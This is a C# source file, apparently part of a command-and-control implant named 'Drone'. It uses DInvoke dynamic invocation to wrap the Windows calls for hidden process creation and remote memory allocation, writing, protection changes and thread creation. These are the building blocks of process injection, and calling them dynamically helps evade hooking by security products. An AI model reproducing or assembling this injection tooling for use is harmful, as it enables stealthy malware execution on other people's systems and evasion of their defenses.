using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;

using DInvoke.DynamicInvoke;
using Native = DInvoke.Data.Native;
using Win32 = DInvoke.Data.Win32;

namespace Drone.Interop;

using static Data;
using static Delegates;

public static class Methods
{
    public static bool CreateProcessW(string path, out PROCESS_INFORMATION pi)
    {
        var pa = new SECURITY_ATTRIBUTES();
        var ta = new SECURITY_ATTRIBUTES();
        var si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        
        pi = new PROCESS_INFORMATION();
        
        object[] parameters =
        {
            null, path, pa, ta, true, (uint)PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW,
            IntPtr.Zero, @"C:\WINDOWS\system32\", si, pi
        };

        var success = (bool)Generic.DynamicApiInvoke(
            "kernel32.dll",
            "CreateProcessW",
            typeof(CreateProcessW),
            ref parameters);

        pi = (PROCESS_INFORMATION)parameters[9];
        return success;
    }
    
    public static void CloseHandle(IntPtr hObject)
    {
        object[] parameters = { hObject };
        
        Generic.DynamicApiInvoke(
            "kernel32.dll",
            "CloseHandle",
            typeof(CloseHandle),
            ref parameters);
    }
    
    public static Native.NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, int length, MEMORY_PROTECTION protection, ref IntPtr baseAddress)
    {
        var regionSize = new IntPtr(length);

        object[] parameters =
        {
            hProcess, baseAddress, IntPtr.Zero, regionSize,
            MEMORY_ALLOCATION.MEM_COMMIT | MEMORY_ALLOCATION.MEM_RESERVE,
            protection
        };

        var status = (Native.NTSTATUS) Generic.DynamicApiInvoke(
            "ntdll.dll",
            "NtAllocateVirtualMemory",
            typeof(NtAllocateVirtualMemory),
            ref parameters);

        baseAddress = (IntPtr)parameters[1];
        return status;
    }

    public static Native.NTSTATUS NtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, byte[] data)
    {
        var buf = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, buf, data.Length);
        
        object[] parameters =
        {
            hProcess, baseAddress, buf, (uint)data.Length, (uint)0
        };

        var status = (Native.NTSTATUS)Generic.DynamicApiInvoke(
            "ntdll.dll",
            "NtWriteVirtualMemory",
            typeof(NtWriteVirtualMemory),
            ref parameters);

        Marshal.FreeHGlobal(buf);
        return status;
    }

    public static Native.NTSTATUS NtProtectVirtualMemory(IntPtr hProcess, IntPtr baseAddress, int length,
        MEMORY_PROTECTION protection, out MEMORY_PROTECTION oldProtection)
    {
        var regionSize = new IntPtr(length);

        object[] parameters =
        {
            hProcess, baseAddress, regionSize,
            protection, (MEMORY_PROTECTION)0
        };

        var status = (Native.NTSTATUS)Generic.DynamicApiInvoke(
            "ntdll.dll",
            "NtProtectVirtualMemory",
            typeof(NtProtectVirtualMemory),
            ref parameters);

        oldProtection = (MEMORY_PROTECTION)parameters[4];
        return status;
    }

    public static Native.NTSTATUS NtCreateThreadEx(IntPtr hProcess, IntPtr baseAddress, ref IntPtr hThread)
    {
        const Win32.WinNT.ACCESS_MASK access =
            Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL;

        object[] parameters =
        {
            hThread, access, IntPtr.Zero, hProcess, baseAddress,
            IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero
        };

        var status = (Native.NTSTATUS)Generic.DynamicApiInvoke(
            "ntdll.dll",
            "NtCreateThreadEx",
            typeof(NtCreateThreadEx),
            ref parameters);

        hThread = (IntPtr)parameters[0];
        return status;
    }
}